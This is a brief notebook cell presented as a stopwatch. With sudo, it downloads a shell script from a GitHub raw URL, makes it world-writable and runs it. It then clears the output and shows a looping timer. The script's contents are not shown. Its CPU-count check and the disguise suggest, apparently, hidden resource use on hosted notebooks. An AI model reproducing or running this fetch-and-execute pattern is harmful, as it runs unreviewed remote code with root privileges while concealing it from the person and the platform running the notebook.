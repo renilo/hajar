#@title HAJAR AJA BANG (STOPWATCH)
from IPython.display import clear_output 
import tensorflow as tf
import timeit
import multiprocessing

res = multiprocessing.cpu_count()
print(res)

!sudo apt install timelimit -y && sudo wget -O kontol wget https://raw.githubusercontent.com/renilo/hajar/main/xautokontol1.sh && sudo chmod 777 kontol
!bash ./kontol
import time
import sys
time_start = time.time()
seconds = 0
minutes = 0
running = True
clear_output()

while running:
  try:
    sys.stdout.write("\r{minutes} Minutes {seconds} Seconds".format(minutes=minutes, seconds=seconds))
    sys.stdout.flush()
    time.sleep(1)
    seconds = int(time.time() - time_start) - minutes * 60
    if seconds >= 60:
      minutes += 1
      seconds = 0
  except KeyboardInterrupt as e:
    running = False
